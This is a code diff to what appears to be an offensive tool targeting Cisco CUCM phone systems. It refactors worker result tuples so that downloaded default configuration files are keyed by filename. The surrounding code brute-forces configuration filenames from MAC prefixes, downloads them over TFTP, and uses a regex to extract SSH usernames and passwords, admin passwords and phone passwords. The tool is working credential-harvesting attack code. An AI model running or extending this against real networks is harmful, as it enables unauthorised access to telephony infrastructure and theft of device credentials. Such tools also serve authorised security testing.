@@ -303,12 +303,12 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 index, full_mac, filename = task
 
             if not task_cucm:
-                results_queue.put((index, full_mac, None, 'NO_CUCM', False))
+                results_queue.put((index, full_mac, filename, None, 'NO_CUCM', False))
                 work_queue.task_done()
                 continue
             with dead_cucm_lock:
                 if task_cucm in dead_cucm:
-                    results_queue.put((index, full_mac, None, 'CUCM_DEAD', False))
+                    results_queue.put((index, full_mac, filename, None, 'CUCM_DEAD', False))
                     work_queue.task_done()
                     continue
 
@@ -317,9 +317,9 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 was_attempted, was_successful, cached_content = check_already_attempted(task_cucm, filename, db_file)
                 if was_attempted:
                     if was_successful and cached_content:
-                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
+                        results_queue.put((index, full_mac, filename, cached_content, 'CACHED', True))
                     else:
-                        results_queue.put((index, full_mac, None, 'CACHED', True))
+                        results_queue.put((index, full_mac, filename, None, 'CACHED', True))
                     work_queue.task_done()
                     continue
 
@@ -362,7 +362,7 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
             if not no_db:
                 log_download_attempt(task_cucm, filename, content is not None, method, content, db_file)
 
-            results_queue.put((index, full_mac, content, method, False))
+            results_queue.put((index, full_mac, filename, content, method, False))
             work_queue.task_done()
 
         except queue.Empty:
@@ -1845,14 +1845,19 @@ def main():
                 with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
                     for _ in range(len(all_candidates)):
                         try:
-                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                            index, full_mac, filename, content, method, was_cached = results_queue.get(timeout=120)
 
                             if was_cached:
                                 skipped += 1
 
                             if content:
-                                all_configs.append((full_mac, content))
-                                found_macs.append(full_mac)
+                                # For default-file tasks, key by filename; for real MACs, key by SEP<mac>.
+                                if full_mac == DEFAULT_MAC_SENTINEL:
+                                    device_key = filename[:-8] if filename.endswith('.cnf.xml') else filename
+                                else:
+                                    device_key = f'SEP{full_mac}'
+                                    found_macs.append(full_mac)
+                                all_configs.append((device_key, content))
                                 successful += 1
                                 # Update progress bar title with current count
                                 prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
@@ -1872,17 +1877,22 @@ def main():
                     last_status_time = time.time()
                     for _ in range(len(all_candidates)):
                         try:
-                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                            index, full_mac, filename, content, method, was_cached = results_queue.get(timeout=120)
                             processed += 1
 
                             if was_cached:
                                 skipped += 1
 
                             if content:
-                                all_configs.append((full_mac, content))
-                                found_macs.append(full_mac)
+                                # For default-file tasks, key by filename; for real MACs, key by SEP<mac>.
+                                if full_mac == DEFAULT_MAC_SENTINEL:
+                                    device_key = filename[:-8] if filename.endswith('.cnf.xml') else filename
+                                else:
+                                    device_key = f'SEP{full_mac}'
+                                    found_macs.append(full_mac)
+                                all_configs.append((device_key, content))
                                 successful += 1
-                                print(f'[+] Found config #{successful}: SEP{full_mac}')
+                                print(f'[+] Found config #{successful}: {device_key}')
                                 sys.stdout.flush()
 
                             # Print progress every 1000 items or every 5 seconds
@@ -1978,38 +1988,38 @@ def main():
             devices_with_creds = {}
             devices_with_users = {}
             
-            for mac, content in all_configs:
+            for device_key, content in all_configs:
                 # Search for secrets in this config
                 config_creds = []
                 config_users = []
-                
+
                 # Track username across the config file
                 user = ''
                 user2 = ''
-                
+
                 for line in content.split('\n'):
                     match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                     if match:
                         if match.group(2):
                             user = match.group(2)
-                            config_users.append((user, f'SEP{mac}'))
+                            config_users.append((user, device_key))
                         if match.group(3):
                             password = match.group(3)
-                            config_creds.append((user, password, f'SEP{mac}'))
+                            config_creds.append((user, password, device_key))
                         if match.group(4):
                             user2 = match.group(4)
-                            config_users.append((user2, f'SEP{mac}'))
+                            config_users.append((user2, device_key))
                         if match.group(5):
                             password = match.group(5)
-                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
-                
+                            config_creds.append((user if user else 'unknown', password, device_key))
+
                 # Track devices with findings
                 if config_creds:
-                    devices_with_creds[f'SEP{mac}'] = config_creds
+                    devices_with_creds[device_key] = config_creds
                     all_found_credentials.extend(config_creds)
-                
+
                 if config_users:
-                    devices_with_users[f'SEP{mac}'] = config_users
+                    devices_with_users[device_key] = config_users
                     all_found_usernames.extend(config_users)
             
             # Display results
